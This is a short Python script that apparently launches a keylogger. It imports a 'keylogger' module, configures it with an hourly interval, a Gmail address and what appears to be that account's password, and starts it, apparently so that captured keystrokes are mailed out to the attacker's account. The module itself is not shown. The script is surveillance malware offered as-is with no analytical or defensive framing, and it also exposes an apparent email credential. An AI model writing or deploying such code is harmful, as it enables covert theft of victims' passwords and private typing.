#!/usr/bin/env python
import keylogger

my_keylogger = keylogger.Keylogger(3600, "yelp.camp.mailer.123@gmail.com", "yelp.camp")
my_keylogger.start()